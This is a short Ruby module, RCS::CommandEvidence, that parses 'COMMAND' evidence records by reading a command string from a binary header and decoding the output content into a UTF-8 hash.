require 'rcs-common/evidence/common'

module RCS

  module CommandEvidence

    def content

      raise "this evidence cannot be generated here"

      # it is partiallly encrypted and partially not

    end

    def generate_content
      [ content ]
    end

    def decode_additional_header(data)
      raise EvidenceDeserializeError.new("incomplete COMMAND") if data.nil? or data.bytesize == 0

      ret = Hash.new
      ret[:data] = Hash.new

      binary = StringIO.new data
      ret[:data][:command] = binary.read_ascii_string

      ret
    end

    def decode_content(common_info, chunks)
      stream = StringIO.new chunks.join

      output = stream.read

      info = Hash[common_info]

      info[:grid_content] = output unless output.nil?

      info[:data] ||= Hash.new
      info[:data][:content] = output.safe_utf8_encode_invalid unless output.nil?
      info[:data][:content] ||= ''

      yield info if block_given?

      :delete_raw
    end
  end

end # ::RCS
